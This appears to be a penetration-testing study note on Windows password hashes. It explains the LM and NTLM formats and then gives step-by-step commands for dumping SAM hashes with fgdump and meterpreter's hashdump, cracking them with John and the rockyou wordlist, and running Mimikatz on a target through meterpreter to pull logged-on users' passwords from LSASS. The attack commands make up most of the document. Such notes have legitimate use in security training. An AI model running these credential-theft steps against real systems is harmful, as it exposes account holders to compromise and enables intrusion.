# Windows Passwords and Hashes

Cryptographically secured hases cannot be reverse, but it is possible to match an existing or "known" hash and thereby determine the original input that created the hash. For Windows we can use tools like `fgdump` and `hashdump` to extract the password hashes, then pass these to tools like `John` to find the clear text.

### Dumping SAM Files

Common way to capture hashes on older Windows systems - the SAM (Security Account Manager) file is a database in Windows XP, Vista, 7, 8.1, and 10 that stores user passwords, and can authenticate both local and remote users on the system. 

### LM 

Windows prior to 2003 used a weak hashing function called LM or LanMan or LAN Manager. This converted all characters to uppercase, then split the password into separate strings of max 7 characters before hashing. 

### NTLM 

Windows Vista and up disable LM and use NTLM. NTLM supports all Unicode characters and case sensitive, although salted hashes are not used, so it is still vulnerable to rainbow table and brute force attacks. 

### Extracting Password Hashes

SAM cannot be access directly while Windows is running, because it's locked by the Windows OS. It is possible to extract from memory however, using `pwdump`, `fgdump`, and `hashdump`.
With `meterpreter` you can simply type `hashdump`. 

What if we need `fgdump` ? 

```shell
upload /usr/share/windows-binaries/fgdump/fgdump.exe c:\\
cd ..\..
fgdump.exe
# Once retrieved, they are written to `127.0.0.1.pwdump`
type 127.0.0.1.pwdump
# Copy contents to hashes.txt
john --wordlist=/usr/share/john/password.lst /root/Desktop/hashes.txt
# Also try out /usr/share/wordlists/rockyou.txt
```

### Retrieving Credentials with Mimikatz

Mimikatz is a popular post-exploitation tool that can retrieve credentials and secrets from system memory. 
https://github.com/gentilkiwi/mimikatz
Once a user signs in, credentials are stored in the Local Security Authority Subsystem Service (LSASS) which is kept in memory. This is intended to facilitate SSO - credentials stored include Kerberos tickets, password hashes and some clear-text passwords.  The following example we will use Windows 7 and Mimikatz.

```bash
# Download from https://github.com/gentilkiwi/mimikatz/releases
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip

# Extract
unzip mimikatz_trunk.zip -d /root/Desktop/Mimikatz/

# Execute on the target system using meterpreter
execute -H -i -c -f /root/Desktop/Mimikatz/x64/mimikatz.exe -m

# With administrator access to the target, need debug access:
privilege::debug
# If all goes well - 'Privilege '20' OK' will be returned
# Otherwise: Error: ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c000061

# Extract passwords of logged-on accounts
sekurlsa::logonpasswords 
```



